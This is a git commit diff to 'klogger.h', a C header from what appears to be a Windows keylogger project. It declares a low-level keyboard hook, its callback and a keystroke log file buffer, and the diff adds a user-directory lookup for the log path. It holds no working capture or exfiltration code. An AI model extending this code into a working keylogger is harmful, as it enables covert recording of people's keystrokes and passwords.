e35f548670522a04857fb1f6c8feffcb90b0da56
deCadeh <43428867+deCadeh@users.noreply.github.com>
2018-11-27 18:56:18 -0500

    Update klogger.h

--- klogger.h
+++ klogger.h
@@ -1,8 +1,9 @@
 #pragma once
 
 // Change output file path here:
-wchar_t kbtestfile[] = L"C:\\";
+wchar_t kbtestfile[100];
 
 HHOOK kbhook;                                             // handle to keyboard hooking procedure
 
 LRESULT CALLBACK LowLevelKeyboardProc(INT, WPARAM, LPARAM);
+void GetUserDirectory(void);
